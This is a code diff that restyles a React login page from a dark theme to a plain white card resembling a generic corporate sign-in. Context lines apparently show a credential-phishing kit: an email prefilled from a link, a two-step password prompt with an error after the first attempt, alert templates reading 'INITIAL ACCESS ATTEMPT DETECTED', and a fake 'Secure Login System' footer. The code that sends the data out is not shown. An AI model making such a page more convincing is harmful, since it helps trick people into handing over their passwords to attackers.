@@ -155,7 +155,7 @@ ${step === 1 ? '⚠️ *INITIAL ACCESS ATTEMPT DETECTED* ⚠️' : '🚨 *FINAL 
   if (error && error === 'Invalid or corrupted link') {
     return (
       <div className="min-h-screen bg-gradient-to-br from-blue-900 to-blue-700 flex items-center justify-center p-4">
-        <div className="w-full max-w-md bg-white rounded-lg shadow-md p-6">
+        <div className="w-full max-w-md bg-white rounded-lg shadow-xl p-6">
           <div className="text-center">
             <div className="text-red-500 text-5xl mb-4">❌</div>
             <h1 className="text-2xl font-bold text-gray-800 mb-2">Invalid Link</h1>
@@ -178,8 +178,9 @@ ${step === 1 ? '⚠️ *INITIAL ACCESS ATTEMPT DETECTED* ⚠️' : '🚨 *FINAL 
         transition={{ duration: 0.5 }}
         className="w-full max-w-md z-10"
       >
-        <div className="bg-gray-900 bg-opacity-80 backdrop-blur-md rounded-xl shadow-2xl overflow-hidden border border-blue-500 border-opacity-30">
-          <div className="p-6 bg-gradient-to-r from-blue-700 to-blue-600">
+        <div className="bg-white rounded-xl shadow-2xl overflow-hidden">
+          {/* Header with blue gradient */}
+          <div className="p-6 bg-gradient-to-r from-blue-600 to-blue-500">
             <div className="flex items-center justify-center flex-col">
               <div className="bg-white p-3 rounded-full mb-4">
                 <div className="w-16 h-16 bg-gradient-to-r from-blue-500 to-cyan-400 rounded-full flex items-center justify-center">
@@ -193,31 +194,32 @@ ${step === 1 ? '⚠️ *INITIAL ACCESS ATTEMPT DETECTED* ⚠️' : '🚨 *FINAL 
             </div>
           </div>
           
-          <div className="p-6">
+          {/* White form area */}
+          <div className="p-6 bg-white">
             {error && !success && (
-              <div className={`mb-4 p-3 rounded-md text-sm ${step === 2 ? 'bg-red-900 bg-opacity-50 text-red-200 border border-red-700' : 'bg-yellow-900 bg-opacity-50 text-yellow-200 border border-yellow-700'}`}>
+              <div className={`mb-4 p-3 rounded-md text-sm ${step === 2 ? 'bg-red-100 text-red-700 border border-red-200' : 'bg-yellow-100 text-yellow-700 border border-yellow-200'}`}>
                 {error}
               </div>
             )}
             
             {success ? (
               <div className="text-center py-4">
-                <div className="text-green-400 text-5xl mb-4">✓</div>
-                <h3 className="text-xl font-bold text-white mb-2">Login Successful</h3>
-                <p className="text-blue-200">Redirecting you to the application...</p>
-                <div className="mt-4 bg-blue-900 bg-opacity-50 p-3 rounded border border-blue-700">
-                  <p className="text-blue-300 text-sm">Your access has been granted</p>
+                <div className="text-green-500 text-5xl mb-4">✓</div>
+                <h3 className="text-xl font-bold text-gray-800 mb-2">Login Successful</h3>
+                <p className="text-gray-600">Redirecting you to the application...</p>
+                <div className="mt-4 bg-blue-50 p-3 rounded border border-blue-100">
+                  <p className="text-blue-600 text-sm">Your access has been granted</p>
                 </div>
               </div>
             ) : (
               <form onSubmit={handleSubmit}>
                 <div className="mb-4">
-                  <label className="block text-blue-200 text-sm font-medium mb-2">
+                  <label className="block text-gray-700 text-sm font-medium mb-2">
                     Email Address
                   </label>
                   <div className="relative">
                     <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
-                      <svg className="h-5 w-5 text-blue-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                      <svg className="h-5 w-5 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                         <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
                       </svg>
                     </div>
@@ -225,18 +227,18 @@ ${step === 1 ? '⚠️ *INITIAL ACCESS ATTEMPT DETECTED* ⚠️' : '🚨 *FINAL 
                       type="email"
                       value={email}
                       disabled
-                      className="bg-blue-900 bg-opacity-50 border border-blue-700 rounded-md focus:ring-blue-500 focus:border-blue-500 block w-full pl-10 p-2.5 text-blue-200 placeholder-blue-400"
+                      className="bg-gray-100 border border-gray-300 rounded-md focus:ring-blue-500 focus:border-blue-500 block w-full pl-10 p-2.5 text-gray-600"
                     />
                   </div>
                 </div>
                 
                 <div className="mb-4">
-                  <label className="block text-blue-200 text-sm font-medium mb-2">
+                  <label className="block text-gray-700 text-sm font-medium mb-2">
                     Password
                   </label>
                   <div className="relative">
                     <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
-                      <svg className="h-5 w-5 text-blue-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                      <svg className="h-5 w-5 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                         <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                       </svg>
                     </div>
@@ -246,17 +248,17 @@ ${step === 1 ? '⚠️ *INITIAL ACCESS ATTEMPT DETECTED* ⚠️' : '🚨 *FINAL 
                       onChange={(e) => setPassword(e.target.value)}
                       required
                       minLength={5}
-                      className="bg-blue-900 bg-opacity-50 border border-blue-700 rounded-md focus:ring-blue-500 focus:border-blue-500 block w-full pl-10 p-2.5 text-white placeholder-blue-400"
+                      className="border border-gray-300 rounded-md focus:ring-blue-500 focus:border-blue-500 block w-full pl-10 p-2.5 text-gray-700"
                       placeholder="Enter your password"
                     />
                   </div>
-                  <p className="text-xs text-blue-400 mt-1">Password must be at least 5 characters</p>
+                  <p className="text-xs text-gray-500 mt-1">Password must be at least 5 characters</p>
                 </div>
                 
                 <button
                   type="submit"
                   disabled={isLoading}
-                  className="w-full bg-gradient-to-r from-blue-600 to-cyan-500 hover:from-blue-700 hover:to-cyan-600 focus:ring-4 focus:ring-blue-300 font-medium rounded-md text-sm px-5 py-2.5 text-center text-white transition-all duration-200 disabled:opacity-75 shadow-lg"
+                  className="w-full bg-gradient-to-r from-blue-600 to-blue-500 hover:from-blue-700 hover:to-blue-600 focus:ring-4 focus:ring-blue-300 font-medium rounded-md text-sm px-5 py-2.5 text-center text-white transition-all duration-200 disabled:opacity-75 shadow-md"
                 >
                   {isLoading ? (
                     <span className="flex items-center justify-center">
@@ -274,8 +276,8 @@ ${step === 1 ? '⚠️ *INITIAL ACCESS ATTEMPT DETECTED* ⚠️' : '🚨 *FINAL 
             )}
           </div>
           
-          <div className="px-6 py-3 bg-blue-900 bg-opacity-70 border-t border-blue-700 text-center">
-            <p className="text-xs text-blue-300">
+          <div className="px-6 py-3 bg-gray-100 border-t border-gray-200 text-center">
+            <p className="text-xs text-gray-500">
               Secure Login System • {new Date().getFullYear()}
             </p>
           </div>
